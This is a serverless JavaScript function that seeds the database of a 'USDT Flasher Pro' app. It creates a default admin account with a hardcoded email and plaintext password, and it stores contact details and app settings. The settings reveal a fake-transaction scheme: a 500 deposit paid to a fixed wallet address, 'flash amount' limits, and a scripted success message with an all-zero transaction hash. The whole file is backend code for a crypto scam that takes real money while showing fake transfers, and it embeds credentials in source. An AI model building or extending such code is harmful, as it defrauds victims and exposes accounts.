const { initializeDatabase, getAll, create, signUp, supabase } = require('./utils/supabase');

exports.handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };

  // Handle preflight OPTIONS request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method Not Allowed' })
    };
  }

  try {
    // Check for initialization key
    const { initKey } = JSON.parse(event.body);
    
    if (initKey !== process.env.INIT_KEY) {
      return {
        statusCode: 401,
        headers,
        body: JSON.stringify({ error: 'Unauthorized' })
      };
    }

    // Initialize database structure
    await initializeDatabase();

    // Check if users exist
    const { data: users, error: usersError } = await supabase
      .from('users')
      .select('*')
      .limit(1);
    
    if (usersError) {
      console.error('Error checking users:', usersError);
    }
    
    if (!users || users.length === 0) {
      // Create default admin user using Supabase Auth
      try {
        const { data: authData, error: authError } = await signUp(
          'mikebtcretriever@gmail.com',
          'Gateway@523',
          {
            display_name: 'Admin User',
            role: 'admin'
          }
        );
        
        if (authError) {
          console.error('Error creating admin user:', authError);
        } else {
          console.log('Admin user created successfully');
          
          // Also add to users table for backward compatibility
          await create('users', {
            email: 'mikebtcretriever@gmail.com',
            display_name: 'Admin User',
            role: 'admin',
            created_at: new Date().toISOString(),
            last_login: null
          });
        }
      } catch (error) {
        console.error('Error creating admin user:', error);
      }
    }

    // Check if contact_info exists
    const { data: contactInfo, error: contactError } = await supabase
      .from('contact_info')
      .select('*')
      .limit(1);
    
    if (contactError) {
      console.error('Error checking contact info:', contactError);
    }
    
    if (!contactInfo || contactInfo.length === 0) {
      // Create default contact info
      await create('contact_info', {
        primary_phone: '+447013216​28',
        secondary_phone: '+14693510740',
        tertiary_phone: '+91 7823232332',
        email: 'support@usdtflasherpro.com',
        website: 'https://usdtflasherpro.com',
        telegram_username: '@usdtflasherpro',
        discord_server: 'discord.gg/usdtflasherpro',
        updated_at: new Date().toISOString()
      });
    }

    // Check if app_settings exists
    const { data: appSettings, error: settingsError } = await supabase
      .from('app_settings')
      .select('*')
      .limit(1);
    
    if (settingsError) {
      console.error('Error checking app settings:', settingsError);
    }
    
    if (!appSettings || appSettings.length === 0) {
      // Create default app settings
      await create('app_settings', {
        app_version: '4.8',
        update_channel: 'stable',
        auto_update: 1,
        theme: 'dark',
        accent_color: '#00e6b8',
        animations_enabled: 1,
        session_timeout: 30,
        require_password_on_startup: 1,
        two_factor_auth: 0,
        default_network: 'trc20',
        max_flash_amount: 100000,
        demo_max_flash_amount: 30,
        live_max_flash_amount: 10000000,
        default_delay_days: 0,
        default_delay_minutes: 0,
        debug_mode: 0,
        log_level: 'info',
        api_endpoint: 'https://api.usdtflasherpro.com/v1',
        
        // Payment Settings
        deposit_amount: 500,
        transaction_fee: 'Transaction Fee',
        wallet_address: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
        
        // Success Modal Settings
        success_title: 'Success',
        success_message: 'The flash has been sent successfully',
        transaction_hash: '0000000000000000000000000000000000000000000000000000000000000000',
        
        updated_at: new Date().toISOString()
      });
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'Database initialized successfully' })
    };
  } catch (error) {
    console.error('Database initialization error:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Database initialization failed' })
    };
  }
};
